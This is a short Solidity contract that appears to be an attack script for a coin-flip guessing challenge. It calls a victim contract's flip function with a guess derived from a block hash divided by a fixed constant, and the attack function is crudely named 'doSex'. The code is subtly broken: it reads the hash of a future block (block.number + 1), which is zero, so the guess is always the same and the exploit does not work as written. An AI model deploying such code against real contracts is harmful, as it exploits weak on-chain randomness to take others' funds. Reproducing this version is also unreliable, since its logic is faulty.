// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IContract{
    function flip(bool _guess) external returns(bool);
}

contract CF {
    IContract victim;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address victim_) public {
        victim = IContract(victim_);
    }

    function doSex() external {
        uint256 blockValue = uint256(blockhash(block.number + 1));

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        victim.flip(side);
    }
}